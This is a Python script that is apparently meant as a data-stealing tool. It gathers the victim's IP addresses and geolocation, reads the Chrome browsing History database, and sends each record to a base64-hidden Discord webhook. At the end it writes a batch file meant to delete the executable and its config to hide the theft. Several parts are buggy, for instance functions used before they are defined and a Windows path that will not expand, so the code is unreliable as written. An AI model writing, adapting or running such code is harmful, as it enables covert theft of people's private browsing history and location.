import os
import json
import sqlite3
import base64
import requests
import time
from time import sleep
import socket
import geocoder
import sys


set=0


# Get ip address


def get_ip():
    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Connect to an external server (doesn't send any data)
        s.connect(("8.8.8.8", 80))

        # Get the local IP address
        private_ip = s.getsockname()[0]

        # Get public IP address
        public_ip = requests.get("https://api.ipify.org").text


        return private_ip, public_ip
    except socket.error as e:
        print(f"Error: {e}")
    finally:
        # Close the socket
        s.close()

# Get and print the private IP address
private_ip = get_ip()
print(f"Public IP: {private_ip[1]}, Private IP: {private_ip[0]}")


def webhook(message_str):
    # Let's send a message to the Discord webhook
    # First, let's get the URL from the config.json
    with open('config.json') as f:
        config = json.load(f)
        webhook_url = config.get('url')

    # Check if the URL is not None and is a valid base64 string
    if webhook_url is not None:
        try:
            if (set == 0):
                send_embed("","Location", (get_current_location()), "#ff0000")
                send_embed("","Internet IP", ("IP Address is " + private_ip + "Public IP is " + public_ip), "#ff0000")
                set=1
            # Let's decode the URL from base64
            decoded_url = base64.b64decode(webhook_url).decode('utf-8')

            # Ensure "discord.com" is in the Discord webhook URL
            if "discord.com" not in decoded_url:
                print("Invalid Discord webhook URL")
                return

            # Let's send the message
            response = requests.post(decoded_url, json={"content": message_str})
            if response.status_code == 204:
                print("Message sent successfully")
            else:
                print(f"Failed to send message. Status code: {response.status_code}")
        except base64.binascii.Error:
            print("Invalid base64-encoded URL in config.json")
    else:
        print("Webhook URL not found in config.json")

# Call the function to send a message

set_var = 0


set_var = 1
# Move the file reading outside of the loop to avoid unnecessary file reads
with open('config.json') as f:
    config = json.load(f)

webhook_url = config.get('url')
decoded_url = base64.b64decode(webhook_url).decode('utf-8')

location_data = get_current_location()
location_dict = {
                        "city": location_data.city,
                        "country": location_data.country,
                    }

send_embed(decoded_url, "Location", location_dict, "#ff0000")
ip_info = get_ip()
response = requests.post(decoded_url, json={"content": (f"IP Address is {ip_info[0]} Public IP is {ip_info[1]} \n Location is {location_dict}")})

# 1. Connect to the database
conn = sqlite3.connect("C:\\Users\\%USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History")

# 2. Create a cursor
cursor = conn.cursor()

# 3. Execute a query
cursor.execute('SELECT * FROM urls')

# 4. Fetch and display the data
rows = cursor.fetchall()

# 5. Format and print the data without special characters




def get_current_location():
    location = geocoder.ip('me')
    return location

def send_embed(webhook_url, title, description, color):
    """This function sends a simple Discord webhook embed"""
    data = {
        "embeds": [
            {
                "title": title,
                "description": description,
                "color": color
            }
        ]
    }
    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
        print("Embed sent successfully")
    else:
        print(f"Failed to send embed. Status code: {response.status_code}")


# Lets use it 


if webhook_url is not None:
    decoded_url = base64.b64decode(webhook_url).decode('utf-8')

    # Ensure "discord.com" is in the Discord webhook URL
    if "discord.com" not in decoded_url:
        print("Invalid Discord webhook URL")
    elif not decoded_url.startswith(('http://', 'https://')):
        print("Invalid URL. URL should start with 'http://' or 'https://'.")
    else:
        for row in rows:
            # Assuming each row is a tuple
            formatted_row = ' '.join(str(cell) for cell in row)

            try:


                # Let's decode the URL from base64

                # Let's send the message
                response = requests.post(decoded_url, json={"content": formatted_row})

                if response.status_code == 204:
                    print("Message sent successfully")
                else:
                    print(f"Failed to send message. Status code: {response.status_code}")
            except base64.binascii.Error:
                print("Invalid base64-encoded URL in config.json")

            sleep(5)
else:
    print("Webhook URL not found in config.json")

# 6. Close the connection
conn.close()

# Self-destruct
with open('self_destruct.bat', 'w') as f:
    f.write("""
@echo off
setlocal

set "files_to_delete=script.exe config.json"




for %%i in (%files_to_delete%) do (
        if exist "%%i" (
            del "%%i"
            echo Deleted %%i
        ) else (
            echo %%i not found, skipping...
        )
    )
) 

endlocal
""")
open('self_destruct.bat')
quit()